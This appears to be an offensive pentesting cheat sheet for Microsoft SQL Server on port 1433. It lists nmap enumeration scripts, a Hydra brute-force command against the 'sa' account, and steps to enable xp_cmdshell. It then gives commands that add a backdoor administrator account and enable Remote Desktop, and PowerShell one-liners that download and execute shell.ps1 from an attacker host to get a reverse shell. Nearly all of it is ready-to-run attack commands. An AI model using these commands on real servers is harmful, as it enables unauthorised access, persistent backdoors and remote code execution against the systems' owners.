# MSSQL - Microsoft SQL Server - 1433

## MSSQL Information

## Automated Enumeration

Nmap has a few scripts that we can use to enumerate MSSQL:

```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

## Bruteforce

Quick brutetroce for pass “SA” password

```
hydra -l sa -P password.txt -V $ip mssql
```

## Authentication

Connect to MSSQL Server:

```
sqsh -S server_address -U sa -P password
```

### sqsh <a href="#sqsh" id="sqsh"></a>

Connect to MSSQL with valid credentials:

```
sqsh -S <ip> -U username -P password
```

### mssqlclient.py <a href="#mssqlclientpy" id="mssqlclientpy"></a>

Authenticate to MSSQL with Windows Authentication:

```
mssqlclient.py mssql-svc@<ip> -windows-auth
mssqlclient.py -port 1435 sa:P@$$Word@<IP>
```

## Execute Shell Commands

Enable xp\_cmdshell:

```
exec sp_configure 'show advanced options', 1;
go
reconfigure;
go
exec sp_configure 'xp_cmdshell', 1;
go
reconfigure;
go
```

Execute System Command:

```
xp_cmdshell 'net user byte bytepass /add';
go
xp_cmdshell 'net localgroup Administrators byte /add';
go
xp_cmdshell 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f';
go
```

## Reverse Shell

```
xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://$IP/shell.ps1") | powershell -noprofile'
```

`mssqlclient.py` from **Impacket**

```bash
mssqlclient.py $DOMAIN/$USERNAME:$PASSWORD@$IP
```

Reverse shell (PowerShell example):

```
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami /all
SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://$IP/shell.ps1") | powershell -noprofile'
```
